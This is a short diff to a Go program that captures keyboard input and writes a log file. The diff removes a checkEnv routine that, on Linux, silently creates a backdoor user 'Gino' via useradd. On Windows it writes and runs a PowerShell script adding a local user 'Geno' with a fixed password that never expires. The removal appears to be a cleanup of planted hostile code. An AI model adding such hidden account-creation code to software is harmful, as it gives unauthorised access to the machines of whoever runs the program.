@@ -6,8 +6,6 @@ import (
 	"log"
 	"net/http"
 	"os"
-	"os/exec"
-
 	"github.com/eiannone/keyboard"
 )
 
@@ -17,34 +15,7 @@ func check(err error)() {
     }
 }
 
-func checkEnv() {
-
-	// gets to current lang set in the terminal env
-	lang := os.Getenv("LANG")
-	operatingSystem := os.Getenv("GOOS")
-	if lang != "en_US.UTF-8" {
-		os.Exit(1)
-	}
-
-	if operatingSystem == "linux" {
-		_, execerr := exec.Command("useradd", "-a", "-m", "-G", "whell", "-s", "/bin/sh", "-p", "1234", "Gino").Output()
-		check(execerr)
-	}
-	
-	if operatingSystem == "windows" {
-		file, fileerr := os.Create("adduser.ps1")
-		check(fileerr)
-
-		file.WriteString("New-LocalUser -AccountNeverExpires -Name 'Geno' -Password '12345' -PasswordNeverExpires")
-		_, execerr := exec.Command("./adduser.ps1").Output()
-		check(execerr)
-	}
-
-}
-
 func main() {
-
-	checkEnv()
 
     // create the log file
     f, err := os.Create("log.txt")
